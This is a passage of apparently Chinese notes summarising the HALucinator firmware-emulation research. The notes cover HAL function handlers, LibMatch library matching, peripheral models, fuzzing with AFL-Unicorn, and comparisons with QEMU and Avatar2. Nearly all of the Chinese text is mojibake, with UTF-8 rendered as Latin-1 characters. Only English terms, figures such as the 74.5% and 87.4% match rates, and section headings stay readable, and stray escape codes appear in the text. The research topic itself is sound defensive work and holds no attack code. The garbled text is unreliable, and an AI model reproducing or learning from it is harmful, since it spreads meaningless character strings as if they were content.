‡ç¨‹åºä¸­å‡½æ•°çš„ä¸Šä¸‹æ–‡ä¸­å·²ç»åŒ¹é…æˆåŠŸçš„å‡½æ•°æ¥æ¨æ–­å‡½æ•°å¯èƒ½æ˜¯ä»€ä¹ˆ æœ€åï¼Œå¦‚æœç»™ç›®æ ‡äºŒè¿›åˆ¶ä¸­çš„ä¸€ä¸ªå‡½æ•°åˆ†é…äº†å”¯ä¸€åç§°ï¼Œåˆ™ç¡®å®šä¸ºæœ‰æ•ˆåŒ¹é…ã€‚ 3.3 é«˜çº§æ¨¡æ‹Ÿ Handlers\næˆ‘ä»¬å°†å›ºä»¶ä¸­ HAL ä»£ç çš„é«˜çº§æ›¿æ¢ç§°ä¸ºå¤„ç†ç¨‹åºï¼ˆHandlersï¼‰ã€‚ åˆ›å»ºå¤„ç†ç¨‹åºæ˜¯æ‰‹åŠ¨å®Œæˆçš„ï¼Œä½†åªéœ€è¦ä¸ºæ¯ä¸ª HAL æˆ–åº“æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”ä¸æ­£åœ¨åˆ†æçš„å›ºä»¶æ— å…³ å‡ ä¹æ‰€æœ‰çš„å¤„ç†ç¨‹åºéƒ½å¾ˆç®€å•ï¼Œå±äºå‡ ä¸ªåŸºæœ¬ç±»åˆ«ä¹‹ä¸€ï¼ˆæ¯”å¦‚åœ¨å¤–å›´æ¨¡å‹ä¸Šæ‰§è¡Œçç¢çš„æ“ä½œï¼Œè¿”å›å¸¸é‡å€¼ï¼Œæˆ–è€…ä»€ä¹ˆéƒ½ä¸åšï¼‰ï¼Œå¯¹äºå¤æ‚çš„ HAL å¯ä»¥åˆ©ç”¨è¿­ä»£è¿‡ç¨‹æ¥æ„å»ºå¤„ç†ç¨‹åº é¦–å…ˆåˆ†æäººå‘˜åœ¨ HALucinator è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®ƒå°†æŠ¥å‘Šå½“å‰æœªè¢«å¤„ç†ç¨‹åºæ›¿æ¢çš„æ‰€æœ‰ I/O è®¿é—®ä»¥åŠä½ç½® å¦‚æœå›ºä»¶å¡ä½äº†ï¼Œæˆ–è€…ç¼ºå°‘æ‰€éœ€çš„è¡Œä¸ºï¼Œåˆ†æäººå‘˜å¯ä»¥è¯„ä¼°å“ªäº›å‡½æ•°åŒ…å« I/O æ“ä½œï¼Œå¹¶è€ƒè™‘å®ç°ä¸€ä¸ªå¤„ç†ç¨‹åºã€‚è¿‡ç¨‹é‡å¤ï¼Œè¿ç»­çš„å¤„ç†ç¨‹åºäº§ç”Ÿæ›´å¤§çš„è¦†ç›–èŒƒå›´å’Œæ›´å‡†ç¡®çš„åŠŸèƒ½ã€‚ å¤–è®¾æ¨¡å‹\nç”¨äºæ¨¡æ‹Ÿå¤–è®¾è¡Œä¸ºï¼Œè´Ÿè´£å¤„ç†å›ºä»¶å’Œå¤–è®¾äº¤äº’çš„æ¨¡å‹ I/O server\nç”¨äºå¤–è®¾æ¨¡å‹å’Œä¸»æœºç³»ç»Ÿçš„äº¤äº’ã€‚ HAL å¤–çš„å¤–è®¾è®¿é—®\nå›ºä»¶ä¸­ä¹Ÿå­˜åœ¨ç›´æ¥å‘èµ·ï¼ˆç»•è¿‡ HALï¼‰çš„ MMIO è®¿é—® HALucinator å°†å‘ç”¨æˆ·æŠ¥å‘Šæ‰€æœ‰æ­¤ç±» I/Oï¼Œå¯¹è¿™äº›åŒºåŸŸçš„æ‰€æœ‰è¯»å–æ“ä½œéƒ½å°†è¿”å›é›¶ï¼Œå¹¶ä¸”æ‰€æœ‰å†™å…¥éƒ½å°†è¢«å¿½ç•¥ï¼Œä»è€Œå…è®¸ç›´æ¥ä¸ç¡¬ä»¶äº¤äº’çš„ä»£ç æ‰§è¡Œè€Œä¸å´©æºƒã€‚ï¼ˆä½œè€…å‘ç°å¤§å¤šæ•° MMIO è®¿é—®å¯ä»¥å®‰å…¨çš„å¿½ç•¥ï¼‰ 3.4 ä½¿ç”¨ HALucinator è¿›è¡Œæ¨¡ç³Šæµ‹è¯• Fuzzed input\nHALucinator æä¾›äº†å°† fuzzer çš„è¾“å…¥æµè½¬å…¥åˆ°å¤„ç†ç¨‹åºçš„æ–¹æ³• Termination\nç›®å‰çš„æ¨¡ç³Šå™¨é€šå¸¸é’ˆå¯¹æ¡Œé¢ç¨‹åºï¼Œå¹¶æœŸæœ›å®ƒä»¬åœ¨è¾“å…¥è€—å°½æ—¶ç»ˆæ­¢; ä½†æ˜¯ï¼Œå›ºä»¶æ°¸è¿œä¸ä¼šç»ˆæ­¢ã€‚ HALucinatorï¼Œè®¾è®¡ fuzz æ¨¡å‹ä»¥ä¼˜é›…åœ°é€€å‡ºç¨‹åºï¼Œå‘ fuzzer å‘é€ä¸€ä¸ªä¿¡å·ï¼Œè¡¨æ˜ç¨‹åºåœ¨æ‰§è¡ŒæœŸé—´æ²¡æœ‰å´©æºƒã€‚ Non-determinism\nå›ºä»¶æœ‰æ˜æ˜¾çš„ä¸ç¡®å®šæ€§è¡Œä¸ºï¼Œå¿…é¡»åˆ é™¤ï¼Œä»¥å…è®¸ fuzzer æ­£ç¡®åœ°æ”¶é›†è¦†ç›–æŒ‡æ ‡ HALucinator åœ¨ç¡®å®šäº§ç”Ÿéšæœºæ€§çš„å‡½æ•°æ—¶ï¼Œä¸ºå®ƒä»¬æä¾›é™æ€å¤„ç†ç¨‹åº Timers\nä¸ç¡®å®šæ€§çš„ä¸€ä¸ªç‰¹æ®Šæƒ…å†µæ˜¯å®šæ—¶å™¨ï¼Œå®ƒç»å¸¸ä½œä¸ºç‰¹æ®Šçš„å¤–å›´è®¾å¤‡å‡ºç°åœ¨å¾®æ§åˆ¶å™¨ä¸­ï¼Œä»¥æŒ‡å®šçš„é—´éš”è§¦å‘ä¸­æ–­å’Œå…¶ä»–äº‹ä»¶ æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå®šæ—¶å™¨å¤–å›´æ¨¡å‹ï¼Œå®ƒå°†è®¡æ—¶å™¨çš„é€Ÿç‡ä¸æ‰§è¡Œå—çš„æ•°é‡è”ç³»èµ·æ¥ï¼Œåˆ›å»ºç¡®å®šçš„è®¡æ—¶å™¨è¡Œä¸ºï¼Œå¹¶å…¬å¹³åœ°æ‰§è¡Œè®¡æ—¶å™¨çš„ä¸­æ–­å¤„ç†ç¨‹åºå’Œä¸»ç¨‹åºï¼Œè€Œä¸è€ƒè™‘ä»¿çœŸé€Ÿåº¦ã€‚ Crash Detection\nåŸºäºé«˜çº§ä»¿çœŸçš„ç³»ç»Ÿä»ä»¿çœŸå™¨æä¾›çš„å¯è§æ€§ä¸­è·å¾—äº†å¤§é‡çš„å´©æºƒæ£€æµ‹èƒ½åŠ› é«˜çº§æ¨¡æ‹Ÿå¤„ç†ç¨‹åºå¯ä»¥æ‰§è¡Œå®ƒä»¬è‡ªå·±çš„æ£€æŸ¥ é«˜çº§ä»¿çœŸè¿˜å¯ç”¨äºè½»æ¾æ·»åŠ é€šå¸¸åœ¨ç¼–è¯‘æ—¶å¤„ç†çš„æ’è£… Input Generation\næ¨¡ç³ŠåŒ–éœ€è¦æœ‰ä»£è¡¨æ€§çš„è¾“å…¥æ¥ä¸ºå…¶çªå˜ç®—æ³•æä¾›ç§å­ã€‚HALucinator çš„å…¨äº¤äº’æ¨¡å¼å¯ç”¨äºä¸è®¾å¤‡äº¤äº’ï¼Œå¹¶è®°å½•æ„Ÿå…´è¶£çš„åº“è°ƒç”¨çš„è¿”å›å€¼ï¼Œè¿™å¯ç”¨äºç§å­æ¨¡ç³Š å®æ–½ LibMatch åŸºäº angr äºŒè¿›åˆ¶åˆ†æå¹³å°ï¼Œå¯¹ angr è¿›è¡Œæ‰©å±•ï¼Œå¢åŠ äº†å¯¹ Cortex-M è°ƒç”¨çº¦å®šã€ç¼ºå¤±æŒ‡ä»¤ã€å‡½æ•°å¼€å§‹æ£€æµ‹å’Œé—´æ¥è·³è½¬è§£æçš„æ”¯æŒã€‚ LibMatch ä½¿ç”¨å¸¦æœ‰ç¬¦å·çš„æœªé“¾æ¥çš„ç›®æ ‡æ–‡ä»¶ï¼Œæ¥åˆ›å»ºå·²çŸ¥å‡½æ•°çš„æ•°æ®åº“ï¼Œä½¿ç”¨è¿™ä¸ªæ•°æ®åº“æ¥å®šä½å›ºä»¶ä¸­æ²¡æœ‰ç¬¦å·çš„å‡½æ•°ã€‚ å½“ LibMatch é’ˆå¯¹å›ºä»¶æ ·ä¾‹è¿è¡Œæ—¶ï¼Œå®ƒè¾“å‡ºä¸€ä¸ªå·²è¯†åˆ«çš„å‡½æ•°åŠå…¶åœ°å€åˆ—è¡¨ï¼Œå¹¶è®°å½•å†²çªï¼Œä»¥é˜²äººå·¥åˆ†æäººå‘˜å¸Œæœ›æ‰‹åŠ¨è§£å†³å†²çªã€‚ HALucinator Implementation HALucinator æ˜¯ç”¨ Python å®ç°çš„ï¼Œå¹¶ä½¿ç”¨ Avatar2 æ¥è®¾ç½®ä¸€ä¸ªå…¨ç³»ç»Ÿ QEMU ä»¿çœŸç›®æ ‡å¹¶æ£€æµ‹å…¶æ‰§è¡Œ è™½ç„¶ Avatar2 é€šå¸¸æ˜¯ä½œä¸ºç¡¬ä»¶åœ¨ç¯ç¼–åˆ¶æ–¹æ¡ˆéƒ¨ç½²çš„ï¼Œä½†æˆ‘ä»¬åœ¨è¿™é‡Œä»…ä½¿ç”¨å®ƒæ¥å®ç°å¯¹ QEMU çš„çµæ´»æ§åˆ¶ï¼Œè€Œä¸æ˜¯ç”¨äºä»»ä½•ä¸ç¡¬ä»¶ç›¸å…³çš„ç›®çš„ è¾“å…¥ï¼šå†…å­˜å¸ƒå±€ã€è¦æ‹¦æˆªçš„å‡½æ•°åˆ—è¡¨å’Œç›¸å…³å¤„ç†ç¨‹åºï¼Œæ¥è‡ª libMatch çš„å‡½æ•°å’Œåœ°å€åˆ—è¡¨ æ“ä½œï¼šåœ¨è¦æ‹¦æˆªçš„æ¯ä¸ªå‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸Šæ”¾ç½®æ–­ç‚¹ï¼Œå¹¶æ³¨å†Œå¤„ç†ç¨‹åºï¼Œä»¥ä¾¿åœ¨å‘½ä¸­æ–­ç‚¹æ—¶æ‰§è¡Œ Handlers å¤„ç†ç¨‹åºè¢«å®ç°ä¸º Python ç±»ï¼Œæ¯ä¸ªå‡½æ•°è¦†ç›–å›ºä»¶çš„ HAL æˆ–åº“ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå‡½æ•° å¯ä»¥è¯»å–æˆ–å†™å…¥æ¨¡æ‹Ÿå™¨çš„å¯„å­˜å™¨å’Œå†…å­˜ è°ƒç”¨å›ºä»¶æœ¬èº«å‡½æ•° ä¸å¤–å›´æ¨¡å‹äº¤äº’ å¤–è®¾æ¨¡å‹ å¤–è®¾æ¨¡å‹ä½œä¸º Python ç±»å®ç°ï¼Œå¯ä»¥å……åˆ†åˆ©ç”¨ç³»ç»Ÿåº“æˆ– I/O æœåŠ¡å™¨æ¥å®ç°æ‰€éœ€çš„åŠŸèƒ½ ä¾‹å¦‚ï¼Œä»ç¡¬ä»¶å®æ—¶æ—¶é’Ÿè·å–æ—¶é—´çš„è°ƒç”¨å¯ä»¥ç®€å•åœ°è°ƒç”¨ä¸»æœºç³»ç»Ÿçš„ time () å‡½æ•°ã€‚ I/O æœåŠ¡å™¨ ä½¿ç”¨ ZeroMQæ¶ˆæ¯ä¼ é€’åº“å®ç°ä¸ºå‘å¸ƒ-è®¢é˜…ç³»ç»Ÿã€‚é™¤äº†å‘ä¸»æœºç³»ç»Ÿçš„å¤–å›´æ¨¡å‹æä¾›äº‹ä»¶å¤–ï¼ŒI/O æœåŠ¡å™¨è¿˜å¯ä»¥å°†æ¨¡æ‹Ÿå™¨çš„å¤–å›´æ¨¡å‹è¿æ¥åœ¨ä¸€èµ·ï¼Œä»è€Œå…è®¸æ¨¡æ‹Ÿå¤šä¸ªäº’è¿çš„ç³»ç»Ÿã€‚ Fuzzing with HALucinator å°† HALucinator ä¸­å¿ƒçš„å…¨ç³»ç»Ÿ QEMU å¼•æ“æ›¿æ¢ä¸º AFLUnicorn AFL- unicorn å°† QEMU çš„ ISA æ¨¡æ‹Ÿç‰¹æ€§ä¸çµæ´»çš„ API ç»“åˆåœ¨ä¸€èµ·ï¼Œå¹¶æä¾› AFL ä½¿ç”¨çš„è¦†ç›–å·¥å…·å’Œåˆ†å‰æœåŠ¡å™¨åŠŸèƒ½ HALucinator çš„é«˜çº§ä»¿çœŸå¯ä»¥æä¾›æ‰€éœ€çš„å¤–å›´ç¡¬ä»¶æ”¯æŒ è¯„ä¼° Library Identification in Binaries æˆ‘ä»¬é¦–å…ˆæ¢è®¨ LibMatch åœ¨äºŒè¿›åˆ¶å›ºä»¶ç¨‹åºä¸­æ¢å¤å‡½æ•°åœ°å€çš„æœ‰æ•ˆæ€§ã€‚ç”±äºå›ºä»¶ä¸­æœ‰å¤šä¸ªä½ç½®å¯èƒ½è¢«è¿æ¥ï¼Œåœ¨æ¨¡æ‹Ÿçš„å¤æ‚æ€§ä¸­æœ‰å„ç§å„æ ·çš„æƒè¡¡ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°è¯•åŒ¹é… HAL åŠå…¶ç›¸å…³ä¸­é—´ä»¶æä¾›çš„æ•´ä¸ªåŠŸèƒ½é›†ã€‚æˆ‘ä»¬åœ¨æ¯ä¸ªç›®æ ‡å›ºä»¶æ ·ä¾‹ä¸­ä½¿ç”¨ç¬¦å·ä¿¡æ¯æ¥æä¾›æ¯ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ã€‚ç„¶åï¼ŒLibMatch å°è¯•ä½¿ç”¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„å‰¥ç¦»ç‰ˆæœ¬ç¡®å®šå…¶ HAL æ•°æ®åº“ä¸­æ¯ä¸ªå‡½æ•°çš„åœ°å€ã€‚è¡¨ 1 æ˜¾ç¤ºäº†ä½¿ç”¨ LibMatch è¿›è¡Œä¸Šä¸‹æ–‡åŒ¹é…å’Œä¸è¿›è¡Œä¸Šä¸‹æ–‡åŒ¹é…çš„ 16 ä¸ªå›ºä»¶ç¤ºä¾‹çš„æ¯”è¾ƒã€‚æ²¡æœ‰ä¸Šä¸‹æ–‡åŒ¹é…çš„ LibMatch ä¸å½“å‰åŒ¹é…ç®—æ³• (ä¾‹å¦‚ï¼ŒBinDiff[28]æˆ– Diaphora[21]) æ‰€å®ç°çš„æ•ˆæœç›¸å½“ã€‚ç„¶è€Œï¼Œç›´æ¥æ¯”è¾ƒæ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸ºè¿™äº›å·¥å…·åªæ‰§è¡Œé“¾æ¥äºŒè¿›åˆ¶åˆ°é“¾æ¥äºŒè¿›åˆ¶çš„æ¯”è¾ƒï¼Œè€Œ LibMatch å¿…é¡»å°†é“¾æ¥äºŒè¿›åˆ¶ä¸ä» HALs å’Œä¸­é—´ä»¶è·å¾—çš„æœªé“¾æ¥åº“å¯¹è±¡é›†åˆç›¸åŒ¹é…ã€‚åœ¨è¡¨ 1 ä¸­ï¼ŒHAL ç¬¦å·çš„æ•°é‡æ˜¯å›ºä»¶ä¸­å­˜åœ¨çš„åº“å‡½æ•°çš„æ•°é‡ï¼Œè€Œâ€œæ­£ç¡®â€åˆ—æ˜¾ç¤ºäº†é‚£äº›æ­£ç¡®è¯†åˆ«çš„å‡½æ•°çš„æ•°é‡ã€‚â€œç¢°æ’â€ã€â€œä¸æ­£ç¡®â€å’Œâ€œç¼ºå¤±â€åˆ—æè¿°äº† LibMatch æ— æ³•æ­£ç¡®è¯†åˆ«æœªåŒ¹é…å‡½æ•°çš„åŸå› ã€‚æœ€åä¸€åˆ—ï¼Œ\u0026rsquo; External \u0026lsquo;æ˜¯ HAL åº“å¤–éƒ¨çš„å‡½æ•°çš„æ•°é‡ï¼ŒLibMatch ä¸ä¸Šä¸‹æ–‡åŒ¹é…æ ‡ç­¾æ­£ç¡®ã€‚æ€»çš„æ¥è¯´ï¼Œåœ¨ 16 ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼Œæ²¡æœ‰ä¸Šä¸‹æ–‡åŒ¹é…çš„ LibMatch å¹³å‡åŒ¹é…äº† 74.5%çš„åº“å‡½æ•°ï¼Œè€Œå¸¦æœ‰ä¸Šä¸‹æ–‡åŒ¹é…çš„ LibMatch å¹³å‡åŒ¹é…äº† 87.4%ã€‚å› æ­¤ï¼Œå‡ ä¹æ‰€æœ‰çš„ HAL å’Œä¸­é—´ä»¶åº“éƒ½ç²¾ç¡®åœ°ä½äºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚ ä¸Šå›¾å¯ä»¥çœ‹åˆ°åœ¨ 16 ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼Œæ²¡æœ‰ä¸Šä¸‹æ–‡åŒ¹é…çš„ LibMatch å¹³å‡åŒ¹é…äº† 74.5%çš„åº“å‡½æ•°ï¼Œè€Œå¸¦æœ‰ä¸Šä¸‹æ–‡åŒ¹é…çš„ LibMatch å¹³å‡åŒ¹é…äº† 87.4%ã€‚å› æ­¤ï¼Œå‡ ä¹æ‰€æœ‰çš„ HAL å’Œä¸­é—´ä»¶åº“éƒ½ç²¾ç¡®åœ°ä½äºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚\n5.2 Scaling of High-Level Emulation Handlers and Human Effort å®ç°å¤„ç†ç¨‹åºæ˜¯ä¸€é¡¹æ‰‹åŠ¨ä»»åŠ¡ï¼Œå› æ­¤éœ€è¦é‡åŒ–å®ç°å¤„ç†ç¨‹åºçš„å·¥ä½œé‡ã€‚å°†å®éªŒä¸­ä½¿ç”¨çš„å¤„ç†ç¨‹åºåˆ†ä¸ºä¸‰ç±»:\næ™®é€šå¤„ç†ç¨‹åºï¼šåªè¿”å›ä¸€ä¸ªå¸¸é‡ï¼Œé€šå¸¸ç”¨äºç¡¬ä»¶åˆå§‹åŒ–å‡½æ•° è½¬åŒ–å¤„ç†ç¨‹åºï¼šå°†æˆªå–çš„å‡½æ•°å‚æ•°è½¬æ¢ä¸ºå¤–è®¾æ¨¡å‹ä¸Šçš„æ“ä½œï¼Œå®ƒä»¬ä¸å®ç°ä»»ä½•é€»è¾‘ï¼Œè€Œåªæ˜¯åœ¨è·å¾—æ¨¡å‹çš„é€‚å½“æ•°æ®åè°ƒç”¨æ¨¡å‹ã€‚ å†…éƒ¨é€»è¾‘å¤„ç†ç¨‹åºï¼šéœ€è¦ç†è§£æ›¿æ¢å‡½æ•°çš„å†…éƒ¨é€»è¾‘ è·¨è®¾å¤‡æ‰©å±• ä¸ºäº†æ¼”ç¤º HLE å¦‚ä½•å…è®¸ä¸€ä¸ª HAL çš„ä»¿çœŸè·¨è®¾å¤‡æ‰©å±•ï¼Œæˆ‘ä»¬ä½¿ç”¨ NXP MCUXpresso HAL çš„æ ·æœ¬æ„å»ºäº†ä¸€ä¸ªå®éªŒï¼Œæ¯ä¸ªæ ·æœ¬æ¥è‡ªä¸åŒçš„æ¿å’Œ CPUã€‚è¿™äº›ä»£è¡¨ NXPs çš„æ¯ä¸ªä¸»è¦ ARM å¾®æ§åˆ¶å™¨äº§å“ç³»åˆ—çš„èŠ¯ç‰‡ï¼ŒåŒ…æ‹¬ Kinetisã€LPC å’Œi.MXï¼Œå®ƒä»¬çš„è®¾è®¡å’Œå¤–è®¾å¸ƒå±€å®Œå…¨ä¸åŒï¼Œå› ä¸ºå®ƒä»¬æ˜¯åœ¨ä»¥å‰ç‹¬ç«‹çš„å…¬å¸å¼€å‘çš„ã€‚ä¸ç®¡å®¶æ—å’Œè¡€ç»Ÿå¦‚ä½•ï¼Œæ‰€æœ‰è¿™äº›éƒ¨åˆ†éƒ½å…±äº«ç›¸åŒçš„ HALã€‚ç»“æœï¼Œæˆ‘ä»¬ä» 20 ä¸ªä¸åŒçš„å¼€å‘æ¿è·å¾—äº† uart_polling ç¤ºä¾‹çš„ 20 ä¸ªå®ä¾‹ã€‚ä¹‹æ‰€ä»¥é€‰æ‹© uart_polling ç¤ºä¾‹ï¼Œæ˜¯å› ä¸ºå‡ ä¹æ¯ä¸ªå•æ¿ä¸Šéƒ½æœ‰ uartï¼Œè€Œå…¶ä»–å¤–è®¾çš„å­˜åœ¨å› å•æ¿è€Œå¼‚ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ç›¸åŒçš„ NXP UART å¤„ç†ç¨‹åºå’Œå¤–è®¾æ¨¡å‹æ¥æ¨¡æ‹Ÿè¿™ 20 ä¸ªå›ºä»¶ç¤ºä¾‹ã€‚å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸‰ä¸ªå¤„ç†ç¨‹åºï¼Œä¸€ä¸ªå‘é€å¤„ç†ç¨‹åºã€ä¸€ä¸ªæ¥æ”¶å¤„ç†ç¨‹åºå’Œä¸€ä¸ªè¿”å› 0 çš„é»˜è®¤å¤„ç†ç¨‹åºã€‚ä¸åŒå›ºä»¶åœ¨ HALucinator é…ç½®ä¸Šçš„å”¯ä¸€å·®å¼‚æ˜¯ RAM/Flash å¸ƒå±€ã€æ—¶é’Ÿæ‹¦æˆªå’Œç”µæºåˆå§‹åŒ–å‡½æ•°ï¼Œæ‰€æœ‰è¿™äº›éƒ½æ˜¯ç”±æ™®é€šçš„é»˜è®¤å¤„ç†ç¨‹åºå¤„ç†çš„ã€‚æ€»å…±æˆªè·äº† 29 ä¸ªç‹¬ç‰¹çš„å‡½æ•°ã€‚æ¯å—æ¿è‡³å°‘æ‹¦æˆª 6 ä¸ªåŠŸèƒ½ï¼Œæœ€å¤š 9 ä¸ªï¼Œå¹³å‡ 6.9 ä¸ªã€‚è¿™è¡¨æ˜ç›¸åŒçš„å¤„ç†ç¨‹åºå’Œæ¨¡å‹å¯ä»¥ç”¨äºæ”¯æŒå¤šä¸ªäº§å“ç³»åˆ—ã€‚å”¯ä¸€çš„æŒ‘æˆ˜æ˜¯è¯†åˆ«è¢«æ‹¦æˆªçš„æ—¶é’Ÿå’Œç”µæºåˆå§‹åŒ–å‡½æ•°çš„åç§°ã€‚\n5.3Interactive Emulation Comparison å®éªŒè®¾ç½®ï¼š\nä½¿ç”¨ QEMUã€Avatar2 [43] å’Œ HALucinator äº¤äº’å¼åœ°é‡æ–°æ‰˜ç®¡è¡¨ 1 ä¸­æ˜¾ç¤ºçš„ 16 ä¸ªå›ºä»¶æ ·æœ¬ åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œä½¿ç”¨ Avatar2 æä¾›çš„ QEMU çš„é»˜è®¤é…ç½®ï¼Œå¹¶åœ¨æ²¡æœ‰ç¡¬ä»¶å­˜åœ¨çš„æƒ…å†µä¸‹å°†å›ºä»¶åŠ è½½å¹¶æ‰§è¡Œåˆ° QEMU ä¸­ã€‚åœ¨è¿™ç§é…ç½®ä¸‹ï¼Œå¯¹ QEMU ä¸­ä¸æ”¯æŒçš„ MMIO çš„ä»»ä½•è®¿é—®éƒ½ä¼šå‡ºé”™ã€‚ HALucinator å¯¹ LibMatch åŒ¹é…çš„å‡½æ•°è¿›è¡Œé«˜çº§æ›¿æ¢ï¼Œå¯¹äºæ‰§è¡Œçš„ä»»ä½• MMIOï¼Œå®ç°äº†ä¸€ä¸ªé»˜è®¤çš„ MMIO å¤„ç†ç¨‹åºï¼Œè¯¥ç¨‹åºå¯¹è¯»å–è¿”å›é›¶ï¼Œå¯¹å†™å…¥é™é»˜å¿½ç•¥ã€‚ ä½œè€…çš„ä¸€äº›è§£é‡Šå’Œè¯´æ˜ï¼š\nä½œè€…æŒ‡å‡ºå¦‚æœæ¨¡æ‹Ÿç³»ç»Ÿä¸Šèƒ½å¤Ÿæ‰§è¡Œä¸çœŸå®ç¡¬ä»¶ç›¸åŒçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆå¤–éƒ¨è¡Œä¸ºå°±æ˜¯â€œæ­£ç¡®â€çš„ æ‰€ä»¥ HALucinator å¯ä»¥åšåˆ°æ­£ç¡®å›åº”å›ºä»¶è¿è¡Œä¸­å¯¹å¤–è®¾çš„è¯·æ±‚ TCP/UDP å¯ä»¥æˆåŠŸä¼ è¾“å’Œç‰©ç†ç¡¬ä»¶ç›¸åŒçš„æ•°æ® èƒ½å¤Ÿè®¿é—® HTTP æœåŠ¡å™¨å›ºä»¶æ ·æœ¬ä¸Šçš„ç›¸åŒé¡µé¢ FatFs ç¤ºä¾‹èƒ½å¤Ÿåœ¨å…¶æ–‡ä»¶ç³»ç»Ÿå†…çš„ç›¸åº”æ–‡ä»¶ä¸­è¯»å–å’Œå†™å…¥æ‰€éœ€æ•°æ® 6LoWPAN ç¤ºä¾‹æˆåŠŸåœ°ç›¸äº’é€šä¿¡ UART ç¤ºä¾‹èƒ½å¤Ÿé€šè¿‡å®ƒä»¬çš„ UART å‘é€å’Œæ¥æ”¶æ•°æ®å¹¶ç»™å‡ºé¢„æœŸçš„å“åº” è™½ç„¶ä½œè€…æŒ‡å‡ºæ— æ³•éªŒè¯å’ŒçœŸå®çš„ç‰©ç†ç¡¬ä»¶ç›¸æ¯”æ˜¯å¦éµå¾ªäº†ç›¸åŒçš„ä»£ç è·¯å¾„ï¼Œä½†æ˜¯ HALucinatior å®ç°çš„æ¨¡æ‹Ÿå·²ç»è¶³å¤Ÿåº”ç”¨äºå…¶ä»–çš„å®‰å…¨æµ‹è¯•ï¼Œæ¯”å¦‚æ¨¡ç³Šæµ‹è¯•ã€‚ HALucinator åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½èƒ½å®ç°æ­£ç¡®çš„é»‘ç›’è¡Œä¸ºâ€”â€”æ‰€æœ‰å‚å•†ã€æ‰€æœ‰æ¿å­ã€æ‰€æœ‰å›ºä»¶æ ·æœ¬ Avatar2 åªæˆåŠŸæ¨¡æ‹Ÿäº† NXP UART å›ºä»¶ï¼Œå› ä¸ºè¿™ä¸ªå›ºä»¶è½®è¯¢ MMIO å¹¶ä¸”ä¸ä½¿ç”¨ä»»ä½•ä¸­æ–­ã€‚ å¯¹äº QEMU æ¥è¯´ï¼Œæä¸å®š MMIOï¼Œå½“å‘ç”Ÿä»»ä½• MMIO æ—¶ï¼ŒQEMU éƒ½æŒ‚äº†ï¼ˆæ€»çº¿æ•…éšœï¼‰ Avatar2 é‡‡ç”¨ MMIO è½¬å‘çš„æ–¹å¼ï¼Œä½†æ˜¯æœ‰çš„å›ºä»¶æœ‰å¯ç”¨äº† SysTick è®¡æ—¶å™¨ï¼Œä½  MMIO ä¸€ç›´ä¸å›åº”ï¼Œå›åº”çš„æ…¢ä¹Ÿä¼šæŒ‚ HALucinator æ‹¦æˆªåˆå§‹åŒ– SysTick è®¡æ—¶å™¨çš„ HAL å‡½æ•°å¹¶æ›¿æ¢ä¸ºä¸€ä¸ªè®¡æ•°å™¨æ¥ä¿æŒæ—¶é—´ï¼›ä½¿å…¶èƒ½å¤Ÿé¿å…è¿™ä¸ªé—®é¢˜ è¡¨ 3 æ˜¾ç¤ºäº†æ¯ä¸ªå›ºä»¶ä½¿ç”¨çš„è½¯ä»¶åº“ä»¥åŠ HALucinator æ¨¡æ‹Ÿçš„æ¥å£ã€‚å¯¹äºæ¯ç§æŠ€æœ¯ï¼Œå®ƒæ˜¾ç¤ºäº†æ‰§è¡Œçš„å”¯ä¸€åŸºæœ¬å—çš„æ•°é‡ï¼ˆâ€œBBâ€ï¼‰ï¼Œè¿™è¡¨æ˜å›ºä»¶æ‰§è¡Œäº†å¤šå°‘ã€‚å®ƒè¿˜æ˜¾ç¤ºå¤–éƒ¨è¾“å…¥å’Œè¾“å‡ºè¡Œä¸ºæ˜¯å¦ä¸åœ¨ç‰©ç†ç¡¬ä»¶ä¸Šæ‰§è¡Œå›ºä»¶æ—¶è§‚å¯Ÿåˆ°çš„åŒ¹é…ï¼ˆå¤–éƒ¨è¡Œä¸ºæ­£ç¡® â€“ â€œEBCâ€ï¼‰ã€‚å¯¹äº Avatar2ï¼Œæˆ‘ä»¬æŠ¥å‘Šè½¬å‘åˆ°æ¿å­çš„è¯»å†™æ¬¡æ•°ï¼ˆâ€œFwd R/Wâ€ï¼‰ï¼Œè¿™è¡¨æ˜ Avatar2 æ­£ç¡®åœ°è½¬å‘äº†å†…å­˜è¯·æ±‚ã€‚å¯¹äº HALucinatorï¼Œæˆ‘ä»¬æŠ¥å‘Šæ‹¦æˆªçš„å‡½æ•°æ•°é‡ï¼ˆâ€œFuncsâ€ï¼‰å’Œé»˜è®¤ MMIO å¤„ç†çš„å”¯ä¸€åœ°å€æ•°é‡ã€‚æ‹¦æˆªçš„å‡½æ•°æ•°é‡ç»™å‡ºäº†ä½¿ç”¨ HALucinator æ¨¡æ‹Ÿå›ºä»¶æ‰€éœ€å·¥ä½œé‡çš„åº¦é‡ï¼Œè€Œä½¿ç”¨é»˜è®¤å¤„ç†ç¨‹åºçš„ MMIO æ˜¯å¯¹ç¡¬ä»¶çš„è®¿é—®ï¼Œè¿™äº›è®¿é—®å¯èƒ½ä¼šè¢«è¿›ä¸€æ­¥æ‹¦æˆª HAL å‡½æ•°æ›¿æ¢ã€‚ è¿™ä¸ªå®éªŒå±•ç¤ºäº† HALucinator å¦‚ä½•å®ç°å¤æ‚å›ºä»¶çš„æ¨¡æ‹Ÿï¼Œè¯¥å›ºä»¶åœ¨çœŸå®ç¡¬ä»¶ä¸Šæ‰§è¡Œæ—¶å…·æœ‰ä¸ç°æœ‰æ–¹æ³•æ— 